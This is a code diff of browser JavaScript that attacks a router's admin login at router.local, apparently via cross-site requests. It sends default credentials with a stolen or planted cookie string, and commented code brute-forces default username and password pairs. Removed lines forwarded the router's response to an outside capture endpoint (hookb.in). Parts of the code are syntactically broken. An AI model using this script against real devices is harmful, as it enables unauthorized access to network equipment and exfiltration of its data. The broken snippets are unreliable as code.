@@ -19,30 +19,28 @@ http.onload = function () {
 };
 
 // http.send();
-http.send(cook+"&username=admin&pin=password&notRobot=on");
+http.send(cook+"&username=admin&pin=admin&notRobot=on");
 
 
 
 // const unames = ["admin","root","cisco"];
 // const pwords = ["123456","admin","password","secured"];
-// var requests=new Array(unames.length * pwords.length);
-// var i = 0;
-
+// var breakCheck = false;
 // for (u in unames) {
 //   for (p in pwords) {
-//     requests[i] = new XMLHttpRequest();
+//     let http = new XMLHttpRequest();
 //     var url = cook+"&username="u+"&pin="+p+"&notRobot=on";
-//     requests[i].open('POST', 'http://router.local/login.php', true);
-//     requests[i].onload = function () {
-//         if (requests[i].responseURL === 'http://router.local/home.php?action=view&'+cook) {
-//                 const xhr = new XMLHttpRequest();
-//                 xhr.open('POST', 'https://hookb.in/NOrwgEmDKjte8mNNl6Nd', true);
-//                 xhr.setRequestHeader('Content-type', 'application/json');
-//                 xhr.send(JSON.stringify(http.response));
-//         }
-//     };
-//     requests[i].send(url)
-//     i = i + 1
+//     http.open('POST', 'http://router.local/login.php', true);
+//        http.onreadystatechange = function() {
+//           if(http.readyState === XMLHttpRequest.DONE && http.status === 200) {
+//             if (http.responseURL === 'http://router.local/home.php?action=view&'+cook) {
+//               breakCheck = true;
+//               break;
+//             }
+//           }
+//        }
+//     http.send(url)
 //   }
+//    if (breakCheck) break;
 // }
 
